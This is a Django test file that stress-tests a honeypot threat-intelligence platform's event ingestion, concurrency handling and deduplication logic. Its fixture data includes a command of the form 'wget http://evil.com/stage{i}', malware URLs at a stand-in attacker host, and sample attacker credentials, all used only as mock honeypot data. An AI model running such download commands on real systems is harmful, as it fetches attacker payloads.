import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from unittest.mock import MagicMock, patch

from django.test import TransactionTestCase
from django.utils import timezone
from rest_framework import status
from rest_framework.test import APIClient

from greedybear.models import (
    IOC,
    CommandSequence,
    Credential,
    EventStatus,
    HoneypotPayload,
    RawEvent,
)
from greedybear.process_event import (
    _process_array_field,
    _process_commands,
    _process_credentials,
    _process_payload_hashes,
    _process_related_urls,
    process_incoming_event,
)
from tests import CustomTestCase, make_api_source, make_sensor, make_user

PATCH_IOCS_FROM_HITS = "greedybear.process_event.iocs_from_hits"
PATCH_IOC_PROCESSOR = "greedybear.process_event.IocProcessor"
PATCH_UPDATE_SCORES = "greedybear.process_event.UpdateScores"
PATCH_GET_ATTACK_TYPE = "greedybear.process_event.get_attack_type"

EVENTS_URL = "/api/events/add/"
STATUS_URL = "/api/events/status/{task_id}/"


def auth_client(user):
    client = APIClient()
    client.force_authenticate(user=user)
    return client


def valid_event(sensor_id, **overrides):
    base = {
        "src_ip": "1.2.3.4",
        "event_type": "login_attempt",
        "timestamp": (timezone.now() - timezone.timedelta(seconds=10)).isoformat(),
        "sensor_id": sensor_id,
    }
    base.update(overrides)
    return base


def make_batch(api_source, task_id="stress-batch-1", batch_status="pending"):
    return EventStatus.objects.create(
        api_source=api_source,
        task_id=task_id,
        status=batch_status,
    )


def make_raw_event(batch, sensor, **kwargs):
    defaults = {
        "src_ip": "10.0.0.1",
        "event_type": "ssh",
        "timestamp": timezone.now() - timezone.timedelta(seconds=5),
        "processed": False,
    }
    defaults.update(kwargs)
    return RawEvent.objects.create(batch=batch, sensor=sensor, **defaults)


def make_ioc_mock(name):
    ioc = MagicMock(spec=IOC)
    ioc.name = name
    ioc.related_urls = []
    return ioc


def unique_ips(count, base_a=10, base_b=0):
    """
    Generate `count` unique routable IPv4 addresses of the form
    <base_a>.<base_b + i//256>.<i % 256>.1 so we never exceed
    the 255 octet limit.
    """
    return [f"{base_a}.{base_b + i // 256}.{i % 256}.1" for i in range(count)]


# API-layer stress, large batch ingestion
class TestLargeBatchIngestion(CustomTestCase):
    """
    Stress the POST /api/events/add/ endpoint with batches close to the
    10 000-event hard cap.  Validates that the API accepts the payload,
    persists every RawEvent row, and returns a single unique task_id.
    """

    def setUp(self):
        self.user = make_user(username="stress_ingest_user")
        self.api_source = make_api_source(self.user, name="StressIngestSource")
        self.sensor = make_sensor(api_source=self.api_source)
        self.client = auth_client(self.user)

    # -- 1a. Maximum allowed batch size --

    @patch("api.views.event.async_task", return_value="task-max")
    def test_10000_events_accepted_and_persisted(self, mock_task):
        """
        A batch of exactly 10 000 events (the documented cap) must be
        accepted with HTTP 202 and every row written to RawEvent.
        """
        base_event = valid_event(self.sensor.id, src_ip="1.2.3.4")
        events = [base_event.copy() for _ in range(10_000)]

        res = self.client.post(EVENTS_URL, {"events": events}, format="json")

        self.assertEqual(res.status_code, status.HTTP_202_ACCEPTED)
        task_id = res.data["task_id"]
        self.assertEqual(
            RawEvent.objects.filter(batch__task_id=task_id).count(),
            10_000,
            "Expected all 10 000 events to be persisted in RawEvent.",
        )
        mock_task.assert_called_once()

    @patch("api.views.event.async_task", return_value="task-over")
    def test_10001_events_rejected_with_400(self, mock_task):
        """
        One event over the cap must be rejected; no RawEvent rows created
        and the background task must never be dispatched.
        """
        events = [valid_event(self.sensor.id) for _ in range(10_001)]
        res = self.client.post(EVENTS_URL, {"events": events}, format="json")

        self.assertEqual(res.status_code, status.HTTP_400_BAD_REQUEST)
        self.assertEqual(RawEvent.objects.count(), 0)
        mock_task.assert_not_called()

    # -- 1b. Large batch with varied optional fields --

    @patch("api.views.event.async_task", return_value="task-varied")
    def test_5000_events_with_optional_fields_accepted(self, mock_task):
        """
        5 000 events each carrying optional fields (protocol, cve_id,
        payload_hash, command, related_url) are all persisted correctly.
        """
        events = [
            valid_event(
                self.sensor.id,
                src_ip="2.3.4.5",
                protocol="ssh",
                cve_id="CVE-2024-0001",
                payload_hash=hashlib.sha256(f"payload{i}".encode()).hexdigest(),
                command=f"wget http://evil.com/stage{i}",
                related_url=f"http://evil.com/malware{i}",
            )
            for i in range(5_000)
        ]
        res = self.client.post(EVENTS_URL, {"events": events}, format="json")

        self.assertEqual(res.status_code, status.HTTP_202_ACCEPTED)
        task_id = res.data["task_id"]
        self.assertEqual(RawEvent.objects.filter(batch__task_id=task_id).count(), 5_000)

    # -- 1c. Repeated submissions produce independent batches --

    @patch("api.views.event.async_task")
    def test_100_sequential_batches_produce_unique_task_ids(self, mock_task):
        """
        100 back-to-back single-event submissions must each return a distinct
        task_id.  This catches any accidental task_id reuse or shared state.
        """
        task_ids = set()
        for _ in range(100):
            res = self.client.post(
                EVENTS_URL,
                {"events": [valid_event(self.sensor.id)]},
                format="json",
            )
            self.assertEqual(res.status_code, status.HTTP_202_ACCEPTED)
            task_ids.add(res.data["task_id"])

        self.assertEqual(
            len(task_ids),
            100,
            "Every submission must produce a unique task_id.",
        )
        self.assertEqual(mock_task.call_count, 100)


# Concurrent submission stress
# Using TransactionTestCase because it commits each setUp write
# to the real DB so all threads share the same visible state.
class TestConcurrentSubmissions(TransactionTestCase):
    """
    Fire multiple POST requests simultaneously from different threads to
    verify that concurrent access does not corrupt batch state, duplicate
    task_ids, or lose events.
    """

    def setUp(self):
        self.user = make_user(username="stress_concurrent_user")
        self.api_source = make_api_source(self.user, name="StressConcurrentSource")
        self.sensor = make_sensor(api_source=self.api_source)

    def _submit(self):
        """
        Each thread creates its own APIClient.  force_authenticate works
        across threads because it sets credentials on the client object, not
        on a shared session.
        """
        client = auth_client(self.user)
        return client.post(
            EVENTS_URL,
            {"events": [valid_event(self.sensor.id)]},
            format="json",
        )

    @patch("api.views.event.async_task")
    def test_20_concurrent_submissions_all_accepted(self, mock_task):
        """
        20 threads posting simultaneously must all receive HTTP 202 and
        produce 20 distinct task_ids with exactly 20 RawEvent rows in the DB.
        """
        from django.db import connections

        def submit_and_close():
            try:
                return self._submit()
                # clossing this thread's DB connection so Django can DROP the test
                # database cleanly after all tests finish.
            finally:
                connections.close_all()

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(submit_and_close) for _ in range(20)]
            results = [f.result() for f in as_completed(futures)]

        statuses = [r.status_code for r in results]
        self.assertTrue(
            all(s == status.HTTP_202_ACCEPTED for s in statuses),
            f"Not all responses were 202: {statuses}",
        )

        task_ids = {r.data["task_id"] for r in results}
        self.assertEqual(
            len(task_ids),
            20,
            "Every concurrent submission must produce a unique task_id.",
        )
        self.assertEqual(RawEvent.objects.count(), 20)

    @patch("api.views.event.async_task")
    def test_concurrent_submissions_create_separate_event_status_rows(self, mock_task):
        """
        Each of 10 concurrent submissions must create exactly one EventStatus
        row; no two submissions may share the same row.
        """
        from django.db import connections

        def submit_and_close():
            result = self._submit()
            connections.close_all()
            return result

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(submit_and_close) for _ in range(10)]
            [f.result() for f in as_completed(futures)]

        self.assertEqual(EventStatus.objects.count(), 10)


class TestProcessIncomingEventStress(CustomTestCase):
    """
    Directly stress the background worker with large numbers of RawEvents,
    verifying that every event is marked processed, the correct ioc_count is
    recorded, and the atomic transaction rolls back completely on a crash.
    """

    def setUp(self):
        self.user = make_user(username="stress_proc_user")
        self.api_source = make_api_source(self.user, name="StressProcSource")
        self.sensor = make_sensor(api_source=self.api_source)

    def _make_batch(self, task_id):
        return EventStatus.objects.create(
            api_source=self.api_source,
            task_id=task_id,
            status="pending",
        )

    # -- 3a. Happy path with 500 IOCs --

    @patch(PATCH_UPDATE_SCORES)
    @patch(PATCH_GET_ATTACK_TYPE, return_value="scanner")
    @patch(PATCH_IOC_PROCESSOR)
    @patch(PATCH_IOCS_FROM_HITS)
    def test_500_raw_events_all_marked_processed(self, mock_hits, mock_proc_cls, mock_attack, mock_scores_cls):
        """
        500 RawEvents must all be flipped to processed=True and batch.ioc_count
        must equal 500 after a successful run.
        """
        batch = self._make_batch("stress-500-proc")
        ips = unique_ips(500)

        for ip in ips:
            make_raw_event(batch, self.sensor, src_ip=ip)

        # Pre-create real IOC rows so processor mock can return them
        saved_iocs = [IOC.objects.create(name=ip, type="ip") for ip in ips]

        mock_hits.return_value = [make_ioc_mock(ip) for ip in ips]
        proc = MagicMock()
        proc.add_ioc.side_effect = saved_iocs
        mock_proc_cls.return_value = proc
        mock_scores_cls.return_value = MagicMock()

        process_incoming_event(self.api_source.id, batch.task_id)

        batch.refresh_from_db()
        self.assertEqual(batch.status, "completed")
        self.assertEqual(batch.ioc_count, 500)
        unprocessed = RawEvent.objects.filter(batch=batch, processed=False).count()
        self.assertEqual(unprocessed, 0, "All 500 RawEvents must be marked processed.")

    # -- 3b. Atomicity: crash mid-pipeline rolls back ALL 300 IOCs --

    @patch(PATCH_UPDATE_SCORES)
    @patch(PATCH_GET_ATTACK_TYPE, return_value="scanner")
    @patch(PATCH_IOC_PROCESSOR)
    @patch(PATCH_IOCS_FROM_HITS)
    def test_atomic_rollback_with_300_iocs_on_crash(self, mock_hits, mock_proc_cls, mock_attack, mock_scores_cls):
        """
        If UpdateScores crashes after 300 IOCs have been written inside the
        transaction, the atomic block must roll back every single one.
        No IOC row must survive in the database.
        """
        batch = self._make_batch("stress-atomic-300")
        ips = unique_ips(300, base_a=11)

        for ip in ips:
            make_raw_event(batch, self.sensor, src_ip=ip)

        mock_hits.return_value = [make_ioc_mock(ip) for ip in ips]

        # Processor creates real DB rows inside the transaction
        created_iocs = []

        def side_effect_add_ioc(ioc, attack_type, honeypot_name=None):
            obj = IOC.objects.create(name=ioc.name, type="ip")
            created_iocs.append(obj)
            return obj

        proc = MagicMock()
        proc.add_ioc.side_effect = side_effect_add_ioc
        mock_proc_cls.return_value = proc

        # Force crash inside UpdateScores (inside the atomic block)
        scores = MagicMock()
        scores.score_only.side_effect = RuntimeError("Broker lost connection during scoring!")
        mock_scores_cls.return_value = scores

        process_incoming_event(self.api_source.id, batch.task_id)

        batch.refresh_from_db()
        self.assertEqual(batch.status, "failed")
        self.assertIn("Broker lost connection", batch.last_error)

        # Every IOC written before the crash must have been rolled back
        leaked = IOC.objects.filter(name__in=ips).count()
        self.assertEqual(
            leaked,
            0,
            f"{leaked} IOC rows leaked into the DB despite atomic rollback.",
        )

        # RawEvents must remain unprocessed so the batch can be retried
        unprocessed = RawEvent.objects.filter(batch=batch, processed=False).count()
        self.assertEqual(unprocessed, 300)

    # -- 3c. All 500 IOCs filtered → batch completes, ioc_count = 0 --

    @patch(PATCH_UPDATE_SCORES)
    @patch(PATCH_GET_ATTACK_TYPE, return_value="scanner")
    @patch(PATCH_IOC_PROCESSOR)
    @patch(PATCH_IOCS_FROM_HITS)
    def test_500_iocs_all_filtered_batch_completes_with_zero_count(self, mock_hits, mock_proc_cls, mock_attack, mock_scores_cls):
        """
        If the processor filters every IOC (returns None for each), the batch
        must still complete successfully with ioc_count=0, and scoring must
        never be called.
        """
        batch = self._make_batch("stress-filtered-500")
        ips = unique_ips(500, base_a=12)

        for ip in ips:
            make_raw_event(batch, self.sensor, src_ip=ip)

        mock_hits.return_value = [make_ioc_mock(ip) for ip in ips]
        proc = MagicMock()
        proc.add_ioc.return_value = None  # every IOC filtered
        mock_proc_cls.return_value = proc
        scores = MagicMock()
        mock_scores_cls.return_value = scores

        process_incoming_event(self.api_source.id, batch.task_id)

        batch.refresh_from_db()
        self.assertEqual(batch.status, "completed")
        self.assertEqual(batch.ioc_count, 0)
        scores.score_only.assert_not_called()

    # -- 3d. Duplicate batch guard at scale --

    @patch(PATCH_IOCS_FROM_HITS)
    def test_already_processing_batch_rejected_without_touching_events(self, mock_hits):
        """
        A batch already in 'processing' state must be skipped immediately;
        none of its 200 RawEvents must be touched.
        """
        batch = self._make_batch("stress-guard-200")
        ips = unique_ips(200, base_a=13)
        for ip in ips:
            make_raw_event(batch, self.sensor, src_ip=ip)

        batch.status = "processing"
        batch.save()

        process_incoming_event(self.api_source.id, batch.task_id)

        # iocs_from_hits must never have been reached
        mock_hits.assert_not_called()

        unprocessed = RawEvent.objects.filter(batch=batch, processed=False).count()
        self.assertEqual(unprocessed, 200, "No RawEvents must be touched when batch is already processing.")


class TestProcessCredentialsStress(CustomTestCase):
    """
    Push _process_credentials with hundreds of distinct and duplicate
    credentials to verify no silent truncation, no duplicate DB rows,
    and correct M2M linkage at scale.
    """

    def setUp(self):
        Credential.objects.all().delete()
        self.user = make_user(username="stress_cred_user")
        self.api_source = make_api_source(self.user, name="StressCredSource")
        self.ioc = IOC.objects.create(name="10.0.1.1", type="ip")

    def _hit(self, username, password, protocol="ssh"):
        return {"_credential": {"username": username, "password": password, "protocol": protocol}}

    def test_500_unique_credentials_all_linked(self):
        """500 distinct username/password pairs must all be created and linked."""
        hits = [self._hit(f"user{i}", f"pass{i}") for i in range(500)]
        _process_credentials(self.ioc, hits)
        self.assertEqual(
            self.ioc.credentials.count(),
            500,
            "All 500 unique credentials must be linked to the IOC.",
        )

    def test_500_duplicate_credentials_produce_single_row(self):
        """
        500 hits that all carry the same credential must result in exactly
        one Credential row — not 500.
        """
        hits = [self._hit("admin", "password") for _ in range(500)]
        _process_credentials(self.ioc, hits)
        self.assertEqual(
            Credential.objects.filter(username="admin", password="password").count(),
            1,
        )

    def test_same_credential_linked_to_500_iocs(self):
        """
        The same credential seen from 500 different attacker IPs must be
        represented as a single Credential row linked to 500 IOCs.
        """
        iocs = [IOC.objects.create(name=f"10.1.{i // 256}.{i % 256}", type="ip") for i in range(500)]
        hit = self._hit("root", "toor")
        for ioc in iocs:
            _process_credentials(ioc, [hit])

        cred = Credential.objects.get(username="root", password="toor")
        self.assertEqual(
            cred.sources.count(),
            500,
            "Single credential must be linked to all 500 IOCs.",
        )

    def test_idempotent_reprocessing_of_500_credentials(self):
        """
        Running _process_credentials twice with the same 500 hits must not
        create any duplicate rows.
        """
        hits = [self._hit(f"u{i}", f"p{i}") for i in range(500)]
        _process_credentials(self.ioc, hits)
        _process_credentials(self.ioc, hits)
        self.assertEqual(Credential.objects.count(), 500)
        self.assertEqual(self.ioc.credentials.count(), 500)


class TestProcessRelatedUrlsStress(CustomTestCase):
    """
    Verify that _process_related_urls handles hundreds of URLs correctly:
    deduplication, sorted storage, idempotency, and no silent truncation.
    """

    def setUp(self):
        self.ioc = IOC.objects.create(name="10.0.2.1", type="ip", related_urls=[])

    def _hit(self, url):
        return {"_related_url": url}

    def test_300_unique_urls_all_stored(self):
        """300 distinct valid URLs must all appear in ioc.related_urls."""
        urls = [f"http://evil.com/payload{i}" for i in range(300)]
        hits = [self._hit(u) for u in urls]
        _process_related_urls(self.ioc, hits)
        self.ioc.refresh_from_db()
        self.assertEqual(len(self.ioc.related_urls), 300)

    def test_300_duplicate_urls_stored_once(self):
        """300 hits with the same URL must produce exactly one entry."""
        hits = [self._hit("http://evil.com/malware") for _ in range(300)]
        _process_related_urls(self.ioc, hits)
        self.ioc.refresh_from_db()
        self.assertEqual(self.ioc.related_urls.count("http://evil.com/malware"), 1)

    def test_300_urls_stored_sorted(self):
        """After inserting 300 URLs the stored list must be in sorted order."""
        urls = [f"http://evil{i:03d}.com/path" for i in range(300)]
        _process_related_urls(self.ioc, [self._hit(u) for u in urls])
        self.ioc.refresh_from_db()
        self.assertEqual(
            self.ioc.related_urls,
            sorted(self.ioc.related_urls),
            "related_urls must be stored sorted.",
        )

    def test_idempotent_reprocessing_of_300_urls(self):
        """Running the same 300 URLs twice must not create duplicate entries."""
        urls = [f"http://evil.com/file{i}" for i in range(300)]
        hits = [self._hit(u) for u in urls]
        _process_related_urls(self.ioc, hits)
        _process_related_urls(self.ioc, hits)
        self.ioc.refresh_from_db()
        self.assertEqual(len(self.ioc.related_urls), 300)

    def test_mixed_valid_and_root_path_urls_only_valid_stored(self):
        """
        200 valid-path URLs mixed with 100 root-path URLs; only the 200 valid
        ones must be stored.
        """
        valid_urls = [f"http://evil.com/malware{i}" for i in range(200)]
        root_urls = [f"http://junk{i}.com/" for i in range(100)]
        hits = [self._hit(u) for u in valid_urls + root_urls]
        _process_related_urls(self.ioc, hits)
        self.ioc.refresh_from_db()
        self.assertEqual(len(self.ioc.related_urls), 200)


class TestProcessCommandsStress(CustomTestCase):
    """
    Stress _process_commands with long command sequences, repeated calls,
    and mixed blank/duplicate lines.
    """

    def setUp(self):
        CommandSequence.objects.all().delete()

    def _hit(self, cmd):
        return {"_command": cmd}

    def test_200_unique_commands_stored_in_order(self):
        """A sequence of 200 unique commands must be stored in exact input order."""
        cmds = [f"step{i}" for i in range(200)]
        _process_commands([self._hit(c) for c in cmds])
        seq = CommandSequence.objects.first()
        self.assertIsNotNone(seq)
        self.assertEqual(seq.commands, cmds)

    def test_200_command_sequence_hash_is_correct(self):
        """The stored SHA-256 hash must match the canonical join of the 200 commands."""
        cmds = [f"cmd{i}" for i in range(200)]
        _process_commands([self._hit(c) for c in cmds])
        expected = hashlib.sha256("|".join(cmds).encode()).hexdigest()
        seq = CommandSequence.objects.first()
        self.assertEqual(seq.commands_hash, expected)

    def test_500_duplicate_commands_deduplicated_to_one_line(self):
        """500 hits with the same command must produce a single-item sequence."""
        _process_commands([self._hit("whoami") for _ in range(500)])
        seq = CommandSequence.objects.first()
        self.assertIsNotNone(seq)
        self.assertEqual(seq.commands, ["whoami"])

    def test_idempotent_reprocessing_same_sequence(self):
        """Reprocessing the exact same sequence 50 times must produce one DB row."""
        cmds = ["ls", "id", "whoami"]
        for _ in range(50):
            _process_commands([self._hit(c) for c in cmds])
        self.assertEqual(CommandSequence.objects.count(), 1)

    def test_100_different_sequences_produce_100_rows(self):
        """
        100 sequences each with a unique first command must produce 100
        distinct CommandSequence rows.
        """
        for i in range(100):
            _process_commands([self._hit(f"unique_cmd_{i}"), self._hit("common_tail")])
        self.assertEqual(CommandSequence.objects.count(), 100)

    def test_blanks_and_whitespace_only_lines_skipped(self):
        """
        A sequence of 200 blank/whitespace-only hits must produce zero rows.
        """
        hits = [self._hit("") for _ in range(100)] + [self._hit("   ") for _ in range(100)]
        _process_commands(hits)
        self.assertEqual(CommandSequence.objects.count(), 0)


class TestProcessArrayFieldStress(CustomTestCase):
    """
    Stress the generic ArrayField helper for `protocols` and `cves` with
    hundreds of values.
    """

    def setUp(self):
        self.ioc = IOC.objects.create(name="10.0.3.1", type="ip", protocols=[], cves=[])

    def _hit(self, key, value):
        return {key: value}

    def test_200_unique_protocols_all_stored(self):
        """200 distinct protocol strings must all appear in ioc.protocols."""
        hits = [self._hit("_protocol", f"proto{i}") for i in range(200)]
        _process_array_field(self.ioc, hits, hit_key="_protocol", field_name="protocols")
        self.ioc.refresh_from_db()
        self.assertEqual(len(self.ioc.protocols), 200)

    def test_200_duplicate_protocols_stored_once_each(self):
        """200 hits with the same protocol must result in exactly one entry."""
        hits = [self._hit("_protocol", "ssh") for _ in range(200)]
        _process_array_field(self.ioc, hits, hit_key="_protocol", field_name="protocols")
        self.ioc.refresh_from_db()
        self.assertEqual(self.ioc.protocols.count("ssh"), 1)

    def test_200_protocols_stored_sorted(self):
        hits = [self._hit("_protocol", f"proto{i:03d}") for i in range(200)]
        _process_array_field(self.ioc, hits, hit_key="_protocol", field_name="protocols")
        self.ioc.refresh_from_db()
        self.assertEqual(self.ioc.protocols, sorted(self.ioc.protocols))

    def test_idempotent_reprocessing_200_protocols(self):
        hits = [self._hit("_protocol", f"proto{i}") for i in range(200)]
        _process_array_field(self.ioc, hits, hit_key="_protocol", field_name="protocols")
        _process_array_field(self.ioc, hits, hit_key="_protocol", field_name="protocols")
        self.ioc.refresh_from_db()
        self.assertEqual(len(self.ioc.protocols), 200)

    def test_200_unique_cves_all_stored(self):
        """200 distinct CVE IDs must all be persisted in ioc.cves."""
        hits = [self._hit("_cve_id", f"CVE-2024-{i:04d}") for i in range(200)]
        _process_array_field(self.ioc, hits, hit_key="_cve_id", field_name="cves")
        self.ioc.refresh_from_db()
        self.assertEqual(len(self.ioc.cves), 200)

    def test_empty_string_values_in_200_hit_batch_all_skipped(self):
        """
        200 hits with empty string values must write nothing to the DB.
        """
        hits = [self._hit("_protocol", "") for _ in range(200)]
        with self.assertNumQueries(0):
            _process_array_field(self.ioc, hits, hit_key="_protocol", field_name="protocols")


class TestProcessPayloadHashesStress(CustomTestCase):
    """
    Stress _process_payload_hashes with hundreds of hashes, repeated calls,
    and cross-IOC linkage to confirm no duplicate rows and correct M2M state.
    """

    def setUp(self):
        HoneypotPayload.objects.all().delete()
        self.user = make_user(username="stress_payload_user")
        self.api_source = make_api_source(self.user, name="StressPayloadSource")
        self.ioc = IOC.objects.create(name="10.0.4.1", type="ip")

    def _sha(self, seed):
        return hashlib.sha256(seed.encode()).hexdigest()

    def _hit(self, sha256):
        return {"_payload_hash": sha256}

    def test_300_unique_hashes_all_linked(self):
        """300 distinct hashes must each create a stub row and link to the IOC."""
        hits = [self._hit(self._sha(f"payload{i}")) for i in range(300)]
        _process_payload_hashes(self.ioc, hits)
        self.assertEqual(HoneypotPayload.objects.count(), 300)
        self.assertEqual(self.ioc.payloads.count(), 300)

    def test_300_duplicate_hashes_produce_single_row(self):
        """300 hits with the same hash must produce exactly one HoneypotPayload."""
        sha = self._sha("duplicate")
        hits = [self._hit(sha) for _ in range(300)]
        _process_payload_hashes(self.ioc, hits)
        self.assertEqual(HoneypotPayload.objects.count(), 1)

    def test_idempotent_reprocessing_of_300_hashes(self):
        """Calling the function twice with the same 300 hashes must not create duplicates."""
        hits = [self._hit(self._sha(f"p{i}")) for i in range(300)]
        _process_payload_hashes(self.ioc, hits)
        _process_payload_hashes(self.ioc, hits)
        self.assertEqual(HoneypotPayload.objects.count(), 300)
        self.assertEqual(self.ioc.payloads.count(), 300)

    def test_same_300_hashes_linked_to_two_iocs(self):
        """
        The same 300 hashes submitted for two different IOCs must produce
        300 HoneypotPayload rows each linked to both IOCs — 600 M2M links total.
        """
        ioc2 = IOC.objects.create(name="10.0.4.2", type="ip")
        hits = [self._hit(self._sha(f"shared{i}")) for i in range(300)]

        _process_payload_hashes(self.ioc, hits)
        _process_payload_hashes(ioc2, hits)

        self.assertEqual(HoneypotPayload.objects.count(), 300)
        self.assertEqual(self.ioc.payloads.count(), 300)
        self.assertEqual(ioc2.payloads.count(), 300)

    def test_uppercase_and_lowercase_same_hash_deduplicates_at_300_scale(self):
        """
        300 hashes submitted in uppercase must deduplicate against the same
        300 already stored in lowercase — total rows must remain 300.
        """
        lower_hits = [self._hit(self._sha(f"case{i}")) for i in range(300)]
        upper_hits = [self._hit(self._sha(f"case{i}").upper()) for i in range(300)]

        _process_payload_hashes(self.ioc, lower_hits)
        _process_payload_hashes(self.ioc, upper_hits)

        self.assertEqual(HoneypotPayload.objects.count(), 300)

    def test_empty_hash_strings_skipped_in_300_hit_batch(self):
        """300 hits with empty hash strings must write nothing to the DB."""
        hits = [self._hit("") for _ in range(300)]
        with self.assertNumQueries(0):
            _process_payload_hashes(self.ioc, hits)
        self.assertEqual(HoneypotPayload.objects.count(), 0)
